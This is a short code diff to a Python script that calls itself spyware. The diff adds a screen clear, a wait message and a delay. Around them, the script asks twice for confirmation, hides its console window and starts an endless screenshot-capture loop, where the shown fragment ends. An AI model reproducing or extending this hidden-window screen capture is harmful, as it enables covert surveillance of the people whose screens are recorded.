@@ -12,6 +12,9 @@ Run = input("This is SPYWARE are you sure you want to run? Y/N | ")
 if Run.upper() == "Y":
     Confirm = input("Are you POSITIVE you want to run this? Y/N | ")
     if Confirm.upper() == "Y":
+        os.system('cls')
+        print("Executing Script Please Wait...")
+        time.sleep(3)
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         while True:
           screenshot = pyautogui.screenshot()
